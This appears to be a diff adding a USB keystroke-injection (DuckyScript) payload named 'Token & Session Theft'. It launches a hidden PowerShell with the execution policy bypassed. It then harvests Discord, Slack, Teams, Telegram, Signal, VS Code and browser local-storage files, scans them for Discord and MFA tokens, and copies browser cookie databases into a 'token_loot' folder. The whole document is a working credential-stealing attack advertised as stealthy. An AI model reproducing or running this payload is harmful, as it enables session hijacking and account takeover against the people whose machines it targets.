@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Token & Session Theft
+REM  FLLC - by PERSON FU
+REM  Time: ~12 seconds | Stealth: HIGH
+REM  Browser sessions, OAuth tokens, JWT, cookies
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\token_loot';md $d -f|Out-Null;$r=@();$r+='=== TOKEN & SESSION THEFT ===';$r+='Time: '+(Get-Date);$r+='';$la=$env:LOCALAPPDATA;$ap=$env:APPDATA;$tokens=@{Discord_App=\"$ap\discord\Local Storage\leveldb\";Discord_Canary=\"$ap\discordcanary\Local Storage\leveldb\";Discord_PTB=\"$ap\discordptb\Local Storage\leveldb\";Slack=\"$ap\Slack\Local Storage\leveldb\";Teams=\"$la\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\";Teams_Classic=\"$ap\Microsoft\Teams\Local Storage\leveldb\";Telegram=\"$ap\Telegram Desktop\tdata\";Signal=\"$ap\Signal\Local Storage\leveldb\";Chrome_Tokens=\"$la\Google\Chrome\User Data\Default\Local Storage\leveldb\";Edge_Tokens=\"$la\Microsoft\Edge\User Data\Default\Local Storage\leveldb\";Brave_Tokens=\"$la\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\";Opera_Tokens=\"$ap\Opera Software\Opera Stable\Local Storage\leveldb\";VS_Code=\"$ap\Code\User\globalStorage\"};foreach($t in $tokens.Keys){$p=$tokens[$t];if(Test-Path $p){$r+=\"[FOUND] $t\";$td=\"$d\$t\";md $td -f|Out-Null;gci $p -fi '*.ldb','*.log','*.json' -ea 0|%{$c=gc $_.FullName -Raw -ea 0;if($c -match '[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}|mfa\.[A-Za-z0-9_-]{84}'){$r+='  [!] TOKEN FOUND in '+$_.Name};cp $_.FullName \"$td\$($_.Name)\" -f 2>$null}}else{$r+=\"[MISS] $t\"}};$r+='';$r+='=== BROWSER COOKIES (Session Tokens) ===';@{Chrome=\"$la\Google\Chrome\User Data\Default\Cookies\";Edge=\"$la\Microsoft\Edge\User Data\Default\Cookies\";Brave=\"$la\BraveSoftware\Brave-Browser\User Data\Default\Cookies\"}.GetEnumerator()|%{if(Test-Path $_.Value){cp $_.Value \"$d\$($_.Key)_Cookies\" -f 2>$null;$r+='[FOUND] '+$_.Key+' cookies'}};$r|Out-File \"$d\results.txt\" -Encoding UTF8"
+ENTER
+DELAY 500
